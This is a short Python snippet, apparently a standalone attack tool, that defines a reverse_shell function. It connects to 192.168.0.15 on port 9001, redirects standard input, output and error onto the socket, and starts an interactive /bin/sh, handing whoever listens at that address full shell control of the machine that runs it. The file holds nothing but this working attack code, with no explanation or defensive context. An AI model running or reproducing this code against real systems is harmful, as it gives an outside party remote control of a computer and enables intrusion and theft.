
import socket,subprocess,os,sys

def reverse_shell():
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
	s.connect(("192.168.0.15",9001));
	os.dup2(s.fileno(),0); 
	os.dup2(s.fileno(),1); 
	os.dup2(s.fileno(),2);
	p=subprocess.call(["/bin/sh","-i"]);
